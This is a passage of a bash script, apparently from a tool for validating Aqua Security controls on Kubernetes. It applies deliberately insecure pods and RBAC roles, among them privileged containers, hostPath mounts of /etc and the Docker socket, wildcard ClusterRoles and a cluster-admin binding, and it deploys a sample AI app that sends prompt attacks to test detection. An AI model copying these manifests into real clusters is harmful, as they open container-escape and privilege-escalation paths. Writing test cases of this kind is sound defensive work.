apiVersion: v1
kind: Pod
metadata:
  name: disallowed-hostpath-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    volumeMounts:
    - name: host-etc
      mountPath: /host-etc
  volumes:
  - name: host-etc
    hostPath:
      path: /etc
EOF
            apply_non_compliant_resource "rbac-manager-bad" <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: rbac-manager-bad
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]
  verbs: ["*"]
EOF
            apply_non_compliant_resource "networking-manager-bad" <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: networking-manager-bad
rules:
- apiGroups: ["networking.k8s.io"]
  resources: ["networkpolicies", "ingresses"]
  verbs: ["*"]
- apiGroups: [""]
  resources: ["services", "endpoints"]
  verbs: ["*"]
EOF
            apply_non_compliant_resource "workload-manager-bad" <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: workload-manager-bad
  namespace: $lab_namespace
rules:
- apiGroups: ["", "apps", "batch"]
  resources: ["pods", "deployments", "daemonsets", "statefulsets", "jobs", "cronjobs"]
  verbs: ["*"]
EOF
            apply_non_compliant_resource "manage-all-resources-bad" <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: manage-all-resources-bad
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
EOF
            apply_non_compliant_resource "namespace-admin-bad" <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: namespace-admin-bad
  namespace: $lab_namespace
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
EOF
            apply_non_compliant_resource "namespace-secret-manager-bad" <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: namespace-secret-manager-bad
  namespace: $lab_namespace
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
EOF
            apply_non_compliant_resource "cluster-secret-manager-bad" <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: cluster-secret-manager-bad
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["*"]
EOF
            apply_non_compliant_resource "webhookconfig-manager-bad" <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: webhookconfig-manager-bad
rules:
- apiGroups: ["admissionregistration.k8s.io"]
  resources: ["mutatingwebhookconfigurations", "validatingwebhookconfigurations"]
  verbs: ["*"]
EOF
            apply_non_compliant_resource "hostaliases-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: hostaliases-bad
  namespace: $lab_namespace
spec:
  hostAliases:
  - ip: "1.2.3.4"
    hostnames:
    - "internal.service.local"
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
EOF
            apply_non_compliant_resource "memory-limit-missing-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: memory-limit-missing-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    resources:
      requests:
        memory: "128Mi"
EOF
            apply_non_compliant_resource "memory-request-missing-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: memory-request-missing-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    resources:
      limits:
        memory: "512Mi"
EOF
            apply_non_compliant_resource "net-raw-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: net-raw-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    securityContext:
      capabilities:
        add:
        - NET_RAW
EOF
            apply_non_compliant_resource "proc-mount-unmasked-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: proc-mount-unmasked-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    securityContext:
      procMount: Unmasked
EOF
            apply_non_compliant_resource "privileged-port-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: privileged-port-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    ports:
    - containerPort: 80
EOF
            apply_non_compliant_resource "privileged-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: privileged-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    securityContext:
      privileged: true
EOF
            apply_non_compliant_resource "writable-rootfs-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: writable-rootfs-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    securityContext:
      readOnlyRootFilesystem: false
EOF
            apply_non_compliant_resource "runs-as-root-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: runs-as-root-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    securityContext:
      runAsUser: 0
EOF
            apply_non_compliant_resource "low-gid-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: low-gid-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    securityContext:
      runAsGroup: 1000
EOF
            apply_non_compliant_resource "low-uid-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: low-uid-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    securityContext:
      runAsUser: 1000
EOF
            apply_non_compliant_resource "apparmor-unconfined-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: apparmor-unconfined-bad
  namespace: $lab_namespace
  annotations:
    container.apparmor.security.beta.kubernetes.io/app: unconfined
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
EOF
            apply_non_compliant_resource "seccomp-unconfined-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: seccomp-unconfined-bad
  namespace: $lab_namespace
spec:
  securityContext:
    seccompProfile:
      type: Unconfined
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
EOF
            apply_non_compliant_resource "selinux-custom-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: selinux-custom-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    securityContext:
      seLinuxOptions:
        user: "system_u"
        role: "system_r"
        type: "spc_t"
        level: "s0:c123,c456"
EOF
            apply_non_compliant_resource "sys-admin-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: sys-admin-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    securityContext:
      capabilities:
        add:
        - SYS_ADMIN
EOF
            apply_non_compliant_resource "sys-module-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: sys-module-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    securityContext:
      capabilities:
        add:
        - SYS_MODULE
EOF
            apply_non_compliant_resource "external-ip-bad" <<EOF
apiVersion: v1
kind: Service
metadata:
  name: external-ip-bad
  namespace: $lab_namespace
spec:
  selector:
    app: demo
  externalIPs:
  - 8.8.8.8
  ports:
  - port: 80
    targetPort: 80
EOF
            apply_non_compliant_resource "specific-capability-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: specific-capability-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    securityContext:
      capabilities:
        add:
        - CHOWN
EOF
            apply_non_compliant_resource "unsafe-sysctl-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: unsafe-sysctl-bad
  namespace: $lab_namespace
spec:
  securityContext:
    sysctls:
    - name: kernel.shm_rmid_forced
      value: "0"
    - name: net.ipv4.ip_forward
      value: "1"
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
EOF
            apply_non_compliant_resource "user-admin-access-bad" <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: user-admin-access-bad
subjects:
- kind: User
  name: developer@example.com
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF
            apply_non_compliant_resource "default-namespace-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: default-namespace-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
EOF
            apply_non_compliant_resource "docker-sock-hostpath-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: docker-sock-hostpath-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    volumeMounts:
    - name: docker-sock
      mountPath: /var/run/docker.sock
  volumes:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
      type: Socket
EOF
            apply_non_compliant_resource "hostpath-volume-bad" <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-volume-bad
  namespace: $lab_namespace
spec:
  containers:
  - name: app
    image: $non_compliant_resource_image
    imagePullPolicy: Always
    volumeMounts:
    - name: host-var-log
      mountPath: /host-var-log
  volumes:
  - name: host-var-log
    hostPath:
      path: /var/log
EOF
            echo
            print_colored_message yellow "[!] Observe that non-compliant resource creation is blocked or reported by Aqua."
            echo
            print_audit_review
            echo
            print_colored_message yellow "Cleanup runs automatically when you select the Terminate Program option."
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Secure AI - Discovery
test_secure_ai_discovery() {
    print_test_header "Secure AI - Discovery"
    local ai_app_name="mars-banking-app"
    local ai_service_name="mars-banking-app-lb"
    local openai_secret_name="openai-api-key"

    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create or update the Aqua policy required for Secure AI Discovery
        2. Ensure that Secure AI discovery controls are enabled for this Kubernetes environment
        3. Ensure that the policy is applied to namespace '$AQUA_PROBE_TEST_NAMESPACE'
        4. Have an OpenAI API key ready. It will be collected as sensitive input and stored as a Kubernetes secret named '$openai_secret_name'"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            echo
            read -s -p "$(format_prompt "Enter OpenAI API key for the AI discovery app: ")" openai_api_key
            echo

            if [ -z "$openai_api_key" ]; then
                print_colored_message red "OpenAI API key cannot be empty. Aborting Secure AI - Discovery deployment."
                return
            fi

            openai_api_key_b64=$(printf '%s' "$openai_api_key" | base64 | tr -d '\n')
            unset openai_api_key

            ensure_test_namespace
            echo
            print_colored_message yellow "Creating Kubernetes secret '$openai_secret_name' in namespace '$AQUA_PROBE_TEST_NAMESPACE'..."
            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: $openai_secret_name
type: Opaque
data:
  OPENAI_API_KEY: $openai_api_key_b64
EOF
            unset openai_api_key_b64

            echo
            print_colored_message yellow "Deploying Secure AI - Discovery sample app with image: ericgomes56/ai-app:1.0"
            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: $ai_app_name
  labels:
    app: $ai_app_name
spec:
  replicas: 1
  selector:
    matchLabels:
      app: $ai_app_name
  template:
    metadata:
      labels:
        app: $ai_app_name
    spec:
      containers:
        - name: $ai_app_name
          image: ericgomes56/ai-app:1.0
          imagePullPolicy: Always
          ports:
            - containerPort: 8501
          env:
            - name: OPENAI_API_KEY
              valueFrom:
                secretKeyRef:
                  name: $openai_secret_name
                  key: OPENAI_API_KEY
---
apiVersion: v1
kind: Service
metadata:
  name: $ai_service_name
spec:
  type: LoadBalancer
  selector:
    app: $ai_app_name
  ports:
    - protocol: TCP
      port: 8501
      targetPort: 8501
EOF
            echo
            print_colored_message yellow "Waiting for Secure AI - Discovery deployment rollout..."
            kubectl rollout status deployment/$ai_app_name -n "$AQUA_PROBE_TEST_NAMESPACE" --timeout=120s
            echo
            print_colored_message yellow "Waiting for LoadBalancer URL..."
            for i in {1..36}; do
                ai_lb_hostname=$(kubectl get service "$ai_service_name" -n "$AQUA_PROBE_TEST_NAMESPACE" -o jsonpath='{.status.loadBalancer.ingress[0].hostname}' 2>/dev/null)
                ai_lb_ip=$(kubectl get service "$ai_service_name" -n "$AQUA_PROBE_TEST_NAMESPACE" -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null)

                if [ -n "$ai_lb_hostname" ]; then
                    ai_app_url="http://$ai_lb_hostname:8501"
                    break
                elif [ -n "$ai_lb_ip" ]; then
                    ai_app_url="http://$ai_lb_ip:8501"
                    break
                fi

                sleep 5
            done

            if [ -n "$ai_app_url" ]; then
                print_colored_message green "[✓] Secure AI app URL: $ai_app_url"
                echo
                print_colored_message yellow "[!] Open the URL above using HTTP and port 8501."
            else
                print_colored_message yellow "[!] LoadBalancer URL is still pending. Run the following command and open the EXTERNAL-IP or hostname using HTTP on port 8501:"
                echo "kubectl get service $ai_service_name -n $AQUA_PROBE_TEST_NAMESPACE"
            fi
            echo
            print_colored_message yellow "[!] In the app, click Request Simulator in the bottom-right corner, click OpenAI, and send the request."
            echo
            print_colored_message yellow "[!] Notice that AI Findings populates in Aqua and an audit event is generated."
            echo
            print_colored_message yellow "[!] Observe that the AI application is discovered by Aqua Secure AI controls."
            echo
            print_colored_message green "[✓] Please login to the Aqua Console and review Secure AI discovery findings for the deployed AI application."
            unset ai_lb_hostname ai_lb_ip ai_app_url
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Secure AI - Unauthorized Models
test_secure_ai_unauthorized_models() {
    print_test_header "Secure AI - Unauthorized Models"
    local ai_app_name="mars-banking-app"
    local ai_service_name="mars-banking-app-lb"
    local openai_secret_name="openai-api-key"
    local ai_app_exists

    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. Create or update the Aqua policy required for Secure AI Unauthorized Models
        2. In the policy, select OpenAI for the Service dropdown
        3. In the policy, set Model Name to 'gpt-4'
        4. Confirm the policy entry looks like 'OpenAI@gpt-4'
        5. Ensure that the policy is applied to namespace '$AQUA_PROBE_TEST_NAMESPACE'
        6. Have an OpenAI API key ready. It will be collected as sensitive input and stored as a Kubernetes secret named '$openai_secret_name'"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            echo
            read -s -p "$(format_prompt "Enter OpenAI API key for the AI unauthorized models test: ")" openai_api_key
            echo

            if [ -z "$openai_api_key" ]; then
                print_colored_message red "OpenAI API key cannot be empty. Aborting Secure AI - Unauthorized Models deployment."
                return
            fi

            openai_api_key_b64=$(printf '%s' "$openai_api_key" | base64 | tr -d '\n')
            unset openai_api_key

            ensure_test_namespace
            echo
            print_colored_message yellow "Creating Kubernetes secret '$openai_secret_name' in namespace '$AQUA_PROBE_TEST_NAMESPACE'..."
            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: $openai_secret_name
type: Opaque
data:
  OPENAI_API_KEY: $openai_api_key_b64
EOF
            unset openai_api_key_b64

            if kubectl get deployment "$ai_app_name" -n "$AQUA_PROBE_TEST_NAMESPACE" >/dev/null 2>&1; then
                ai_app_exists="true"
                echo
                print_colored_message yellow "Existing Secure AI sample app found. Reusing deployment '$ai_app_name' for this test."
                kubectl rollout restart deployment/$ai_app_name -n "$AQUA_PROBE_TEST_NAMESPACE"
            else
                ai_app_exists="false"
            fi

            if [ "$ai_app_exists" != "true" ]; then
                echo
                print_colored_message yellow "Deploying Secure AI sample app with image: ericgomes56/ai-app:1.0"
                kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: $ai_app_name
  labels:
    app: $ai_app_name
spec:
  replicas: 1
  selector:
    matchLabels:
      app: $ai_app_name
  template:
    metadata:
      labels:
        app: $ai_app_name
    spec:
      containers:
        - name: $ai_app_name
          image: ericgomes56/ai-app:1.0
          imagePullPolicy: Always
          ports:
            - containerPort: 8501
          env:
            - name: OPENAI_API_KEY
              valueFrom:
                secretKeyRef:
                  name: $openai_secret_name
                  key: OPENAI_API_KEY
---
apiVersion: v1
kind: Service
metadata:
  name: $ai_service_name
spec:
  type: LoadBalancer
  selector:
    app: $ai_app_name
  ports:
    - protocol: TCP
      port: 8501
      targetPort: 8501
EOF
            else
                kubectl get service "$ai_service_name" -n "$AQUA_PROBE_TEST_NAMESPACE" >/dev/null 2>&1 || kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: v1
kind: Service
metadata:
  name: $ai_service_name
spec:
  type: LoadBalancer
  selector:
    app: $ai_app_name
  ports:
    - protocol: TCP
      port: 8501
      targetPort: 8501
EOF
            fi

            echo
            print_colored_message yellow "Waiting for Secure AI deployment rollout..."
            kubectl rollout status deployment/$ai_app_name -n "$AQUA_PROBE_TEST_NAMESPACE" --timeout=120s
            echo
            print_colored_message yellow "Waiting for LoadBalancer URL..."
            for i in {1..36}; do
                ai_lb_hostname=$(kubectl get service "$ai_service_name" -n "$AQUA_PROBE_TEST_NAMESPACE" -o jsonpath='{.status.loadBalancer.ingress[0].hostname}' 2>/dev/null)
                ai_lb_ip=$(kubectl get service "$ai_service_name" -n "$AQUA_PROBE_TEST_NAMESPACE" -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null)

                if [ -n "$ai_lb_hostname" ]; then
                    ai_app_url="http://$ai_lb_hostname:8501"
                    break
                elif [ -n "$ai_lb_ip" ]; then
                    ai_app_url="http://$ai_lb_ip:8501"
                    break
                fi

                sleep 5
            done

            if [ -n "$ai_app_url" ]; then
                print_colored_message green "[✓] Secure AI app URL: $ai_app_url"
                echo
                print_colored_message yellow "[!] Open the URL above using HTTP and port 8501."
            else
                print_colored_message yellow "[!] LoadBalancer URL is still pending. Run the following command and open the EXTERNAL-IP or hostname using HTTP on port 8501:"
                echo "kubectl get service $ai_service_name -n $AQUA_PROBE_TEST_NAMESPACE"
            fi
            echo
            print_colored_message yellow "[!] In the app, click Request Simulator in the bottom-right corner, click OpenAI, choose model override type 'gpt-4', and send the request."
            echo
            print_colored_message yellow "[!] Notice that AI Findings populates in Aqua and an audit event is generated for the unauthorized model request."
            echo
            print_colored_message green "[✓] Please login to the Aqua Console and review Secure AI findings and audit events for OpenAI@gpt-4."
            unset ai_lb_hostname ai_lb_ip ai_app_url ai_app_exists
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Secure AI - Protection
test_secure_ai_protection() {
    print_test_header "Secure AI - Protection"
    local ai_app_name="mars-banking-app"
    local ai_service_name="mars-banking-app-lb"
    local openai_secret_name="openai-api-key"
    local ai_app_exists

    if [ "$AQUA_PROBE_SKIP_INSTRUCTIONS" ]; then
        prerequisites_met="Y" # Set prerequisites_met to 'Y' immediately
    else
        # Ask user if prerequisites are met
        echo
        print_instructions "
        1. This is an Aqua SaaS tenant feature ONLY and is not supported for on-prem Aqua tenants
        2. Enable Prompt Protection Settings under Administration -> Integrations -> Secure AI
        3. Ensure that Secure AI protection controls are enabled for this Kubernetes environment
        4. Ensure that the policy is applied to namespace '$AQUA_PROBE_TEST_NAMESPACE'
        5. Have an OpenAI API key ready. It will be collected as sensitive input and stored as a Kubernetes secret named '$openai_secret_name'"
        echo
        read -p "$(format_prompt "Ready to run this test? (y/n): ")" prerequisites_met
    fi

    case $prerequisites_met in
        [Yy]*)
            echo
            read -s -p "$(format_prompt "Enter OpenAI API key for the AI protection test: ")" openai_api_key
            echo

            if [ -z "$openai_api_key" ]; then
                print_colored_message red "OpenAI API key cannot be empty. Aborting Secure AI - Protection deployment."
                return
            fi

            openai_api_key_b64=$(printf '%s' "$openai_api_key" | base64 | tr -d '\n')
            unset openai_api_key

            ensure_test_namespace
            echo
            print_colored_message yellow "Creating Kubernetes secret '$openai_secret_name' in namespace '$AQUA_PROBE_TEST_NAMESPACE'..."
            kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: $openai_secret_name
type: Opaque
data:
  OPENAI_API_KEY: $openai_api_key_b64
EOF
            unset openai_api_key_b64

            if kubectl get deployment "$ai_app_name" -n "$AQUA_PROBE_TEST_NAMESPACE" >/dev/null 2>&1; then
                ai_app_exists="true"
                echo
                print_colored_message yellow "Existing Secure AI sample app found. Reusing deployment '$ai_app_name' for this test."
                kubectl rollout restart deployment/$ai_app_name -n "$AQUA_PROBE_TEST_NAMESPACE"
            else
                ai_app_exists="false"
            fi

            if [ "$ai_app_exists" != "true" ]; then
                echo
                print_colored_message yellow "Deploying Secure AI sample app with image: ericgomes56/ai-app:1.0"
                kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: $ai_app_name
  labels:
    app: $ai_app_name
spec:
  replicas: 1
  selector:
    matchLabels:
      app: $ai_app_name
  template:
    metadata:
      labels:
        app: $ai_app_name
    spec:
      containers:
        - name: $ai_app_name
          image: ericgomes56/ai-app:1.0
          imagePullPolicy: Always
          ports:
            - containerPort: 8501
          env:
            - name: OPENAI_API_KEY
              valueFrom:
                secretKeyRef:
                  name: $openai_secret_name
                  key: OPENAI_API_KEY
---
apiVersion: v1
kind: Service
metadata:
  name: $ai_service_name
spec:
  type: LoadBalancer
  selector:
    app: $ai_app_name
  ports:
    - protocol: TCP
      port: 8501
      targetPort: 8501
EOF
            else
                kubectl get service "$ai_service_name" -n "$AQUA_PROBE_TEST_NAMESPACE" >/dev/null 2>&1 || kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
apiVersion: v1
kind: Service
metadata:
  name: $ai_service_name
spec:
  type: LoadBalancer
  selector:
    app: $ai_app_name
  ports:
    - protocol: TCP
      port: 8501
      targetPort: 8501
EOF
            fi

            echo
            print_colored_message yellow "Waiting for Secure AI deployment rollout..."
            kubectl rollout status deployment/$ai_app_name -n "$AQUA_PROBE_TEST_NAMESPACE" --timeout=120s
            echo
            print_colored_message yellow "Waiting for LoadBalancer URL..."
            for i in {1..36}; do
                ai_lb_hostname=$(kubectl get service "$ai_service_name" -n "$AQUA_PROBE_TEST_NAMESPACE" -o jsonpath='{.status.loadBalancer.ingress[0].hostname}' 2>/dev/null)
                ai_lb_ip=$(kubectl get service "$ai_service_name" -n "$AQUA_PROBE_TEST_NAMESPACE" -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null)

                if [ -n "$ai_lb_hostname" ]; then
                    ai_app_url="http://$ai_lb_hostname:8501"
                    break
                elif [ -n "$ai_lb_ip" ]; then
                    ai_app_url="http://$ai_lb_ip:8501"
                    break
                fi

                sleep 5
            done

            if [ -n "$ai_app_url" ]; then
                print_colored_message green "[✓] Secure AI app URL: $ai_app_url"
                echo
                print_colored_message yellow "[!] Open the URL above using HTTP and port 8501."
            else
                print_colored_message yellow "[!] LoadBalancer URL is still pending. Run the following command and open the EXTERNAL-IP or hostname using HTTP on port 8501:"
                echo "kubectl get service $ai_service_name -n $AQUA_PROBE_TEST_NAMESPACE"
            fi
            echo
            print_colored_message yellow "[!] In the app, click Attack Library in the bottom-right corner and choose any one of the examples there."
            echo
            print_colored_message yellow "[!] Notice that Secure AI Protection evaluates the prompt and related AI Findings and audit events are generated in Aqua."
            echo
            print_colored_message green "[✓] Please login to the Aqua Console and review Secure AI findings and audit events for the protection test."
            unset ai_lb_hostname ai_lb_ip ai_app_url ai_app_exists
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}


# Terminate the program
terminate_program() {
    read -p "$(format_prompt "Are you sure you want to terminate the program? (y/n): ")" terminate_choice
    case $terminate_choice in
        [Yy]*)
            cleanup_aqua_probe_artifacts
            unset AQUA_PROBE_SKIP_INSTRUCTIONS # Unset env var for skip instructions flag
            unset AQUA_PROBE_IMAGE # Unset env var for image flag
            unset AQUA_PROBE_DAEMONSET # Unset env var for daemonset flag
            unset AQUA_PROBE_NAMESPACE # Unset env var for namespace flag
            exit
            ;;
        [Nn]*)
            echo "Cancelled termination. Returning to the main menu."
            ;;
        *)
            echo "Invalid input. Returning to the main menu."
            ;;
    esac
}


#
# Main
# 
# Dedicated container controls use owned pods so repeat runs and termination can clean up.
confirm_container_control() {
    local control="$1" instructions="$2" proceed
    print_instructions "Scope the policy to namespace $AQUA_PROBE_TEST_NAMESPACE and this test image.
$instructions"
    read -r -p "$(format_prompt "Ready to run this test? (y/n): ")" proceed || return 1
    [[ "$proceed" =~ ^[Yy]$ ]]
}

review_container_control() {
    print_audit_review
    print_colored_message yellow "A Kubernetes rejection, image pull failure or command error alone does not prove Aqua blocked the action."
}

create_control_pod() {
    local pod="$1" image="$2" overrides="${3:-}" owner
    [[ -n "$overrides" ]] || overrides='{}'
    ensure_test_namespace || return 1
    owner=$(kubectl get pod "$pod" -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found -o 'jsonpath={.metadata.labels.aqua-probe-control}') || return 1
    if [[ -n "$owner" ]]; then
        [[ "$owner" == dedicated ]] || { echo "Refusing to replace a pod not owned by this test."; return 1; }
        kubectl delete pod "$pod" -n "$AQUA_PROBE_TEST_NAMESPACE" --wait=true || return 1
    elif kubectl get pod "$pod" -n "$AQUA_PROBE_TEST_NAMESPACE" >/dev/null 2>&1; then
        print_colored_message text "A pod with this name already exists without the test ownership label."; return 1
    fi
    kubectl run "$pod" -n "$AQUA_PROBE_TEST_NAMESPACE" --image="$image" \
        --image-pull-policy=Always --restart=Never --labels=aqua-probe-control=dedicated \
        --override-type=strategic --overrides="$overrides" --command -- sleep 3600 || return 1
    if ! kubectl wait pod/"$pod" -n "$AQUA_PROBE_TEST_NAMESPACE" --for=condition=Ready --timeout=60s; then
        kubectl describe pod "$pod" -n "$AQUA_PROBE_TEST_NAMESPACE"
        return 1
    fi
}

test_block_outdated_images() {
    print_test_header "Block Outdated Images"
    local image
    confirm_container_control "Block Outdated Images" "Enable Block Outdated Images in Enforce mode. Choose an image confirmed as outdated by your Aqua policy's configured criteria. An old tag alone is not evidence. Keep unrelated image controls from masking the result." || return
    image=$(prompt_for_test_image "Image classified as outdated by the configured policy") || return
    print_colored_message yellow "The default image is only a candidate; verify that it meets the outdated-image criteria."
    if create_control_pod aqua-outdated-image-test "$image"; then
        print_colored_message text "Pod became ready. Verify the policy matches and whether Aqua considered this image outdated."
    else
        print_colored_message yellow "Pod did not become ready; inspect the Kubernetes output and Aqua audit evidence."
    fi
    review_container_control
}

test_capabilities_block() {
    print_test_header "Capabilities Block"
    local image overrides
    confirm_container_control "Capabilities Block" "Linux only. Enforce only. Requires container restart after policy changes.
In the Container Runtime Policy, select Enable Capabilities Block control and choose CHOWN under Drop Capabilities, then save the policy.
ALL is also available, but CHOWN isolates this example. Other dropdown capabilities require their own validation actions.
Allow container exec and the test executables. Other controls such as Limit Container Privileges must not prevent this root pod from starting with an added capability.
After confirmation this test recreates its owned pod so the updated policy applies at container startup.
The pod requests CHOWN as its only capability; Aqua should remove it through the selected Drop Capabilities setting." || return
    image=$(prompt_for_test_image "Linux image with sleep, touch, chown and cat") || return
    overrides='{"spec":{"nodeSelector":{"kubernetes.io/os":"linux"},"containers":[{"name":"aqua-capabilities-block-test","securityContext":{"runAsUser":0,"capabilities":{"drop":["ALL"],"add":["CHOWN"]}}}]}}'
    if create_control_pod aqua-capabilities-block-test "$image" "$overrides"; then
        print_colored_message text "Inspect CapEff and CapBnd in PID 1's status; CHOWN is bit 0 and should be absent after dropping it."
        kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" aqua-capabilities-block-test -- cat /proc/1/status || return 1
        if ! kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" aqua-capabilities-block-test -- touch /tmp/aqua-chown-test; then
            print_colored_message yellow "File setup failed; the CHOWN test was not attempted."
            return 1
        fi
        if kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" aqua-capabilities-block-test -- chown 12345 /tmp/aqua-chown-test; then
            print_colored_message text "Ownership change succeeded; verify the blocked capability and policy scope."
        else
            print_colored_message yellow "Ownership change failed; confirm CHOWN was removed and the intended policy applied before attributing the failure to Aqua."
        fi
    fi
    print_colored_message yellow "Capability removal may surface as a kernel permission error; an Aqua incident for each denied operation is not guaranteed."
    review_container_control
}

test_executables_allowed() {
    print_test_header "Executables Allowed"
    local image
